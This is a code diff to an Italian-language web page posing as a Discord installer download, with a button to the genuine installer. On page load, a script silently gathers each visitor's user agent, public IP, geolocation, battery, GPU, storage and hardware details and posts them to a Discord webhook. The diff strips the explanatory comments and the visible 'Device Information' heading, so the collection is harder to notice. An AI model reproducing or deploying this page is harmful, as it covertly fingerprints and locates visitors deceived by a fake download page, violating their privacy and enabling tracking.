@@ -4,41 +4,39 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Discord</title>
-    <h1>Installazione di discord sotto</h1>
+    <h1>Installazione di Discord sotto</h1>
     <button onclick="window.location.href='https://discord.com/api/downloads/distributions/app/installers/latest?channel=stable&platform=win&arch=x64';">
         Installazione
     </button>
 </head>
 <body>
-    <h1>Device Information</h1>
 
     <script>
         async function getDeviceInfo() {
             const deviceInfo = {
-                userAgent: navigator.userAgent,           // Informazioni sul browser e sistema operativo
-                platform: navigator.platform,             // Piattaforma del sistema operativo
-                language: navigator.language,             // Lingua del browser
-                cookiesEnabled: navigator.cookieEnabled,  // Stato dei cookie
-                screenResolution: `${window.screen.width}x${window.screen.height}`,  // Risoluzione dello schermo
-                colorDepth: window.screen.colorDepth,     // Profondità dei colori
-                online: navigator.onLine,                 // Stato della connessione
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                colorDepth: window.screen.colorDepth,
+                online: navigator.onLine,
                 connection: navigator.connection ? {
                     effectiveType: navigator.connection.effectiveType,
                     downlink: navigator.connection.downlink,
                     rtt: navigator.connection.rtt
-                } : null,                                 // Informazioni sulla connessione di rete
-                battery: null,                            // Informazioni sulla batteria (da ottenere)
-                ipAddress: null,                          // Indirizzo IP (da ottenere)
-                webGLRenderer: null,                      // WebGL Renderer (da ottenere)
-                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,  // Fuso orario
-                location: null,                           // Geolocalizzazione (da ottenere)
-                hardwareConcurrency: navigator.hardwareConcurrency,  // Numero di core CPU
-                memory: navigator.deviceMemory || 'N/A',  // Memoria RAM (GB)
-                storageEstimate: null,                    // Spazio di archiviazione disponibile (da ottenere)
-                doNotTrack: navigator.doNotTrack          // Preferenza Do Not Track
+                } : null,
+                battery: null,
+                ipAddress: null,
+                webGLRenderer: null,
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                location: null,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                memory: navigator.deviceMemory || 'N/A',
+                storageEstimate: null,
+                doNotTrack: navigator.doNotTrack
             };
 
-            // Ottieni lo stato della batteria
             if (navigator.getBattery) {
                 const battery = await navigator.getBattery();
                 deviceInfo.battery = {
@@ -49,14 +47,12 @@
                 };
             }
 
-            // Ottieni l'indirizzo IP tramite un servizio esterno
             await fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     deviceInfo.ipAddress = data.ip;
                 });
 
-            // Ottieni la posizione geografica
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(position => {
                     deviceInfo.location = {
@@ -67,7 +63,6 @@
                 });
             }
 
-            // Ottieni il WebGL Renderer
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
             if (gl) {
@@ -77,7 +72,6 @@
                 }
             }
 
-            // Ottieni una stima dello spazio di archiviazione
             if (navigator.storage && navigator.storage.estimate) {
                 const estimate = await navigator.storage.estimate();
                 deviceInfo.storageEstimate = {
@@ -86,14 +80,11 @@
                 };
             }
 
-            // Costruisci il payload
             const payload = {
-                title: "Device Information",
-                details: deviceInfo
+                content: "Device Information: " + JSON.stringify(deviceInfo, null, 2)
             };
 
-            // Invia i dati al webhook (modifica l'URL con il tuo webhook o server)
-            const webhookUrl = 'https://discord.com/api/webhooks/1272243742962614374/6qq-6f1Y7sXupLfshryiw4nkNMOQFHGOzWd0l0iG0p-1SzJxHd0nScxzWHTMiZ2SJ9eM';
+            const webhookUrl = 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN';
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
@@ -111,7 +102,6 @@
             });
         }
 
-        // Esegui la funzione al caricamento della pagina
         window.onload = getDeviceInfo;
     </script>
 </body>
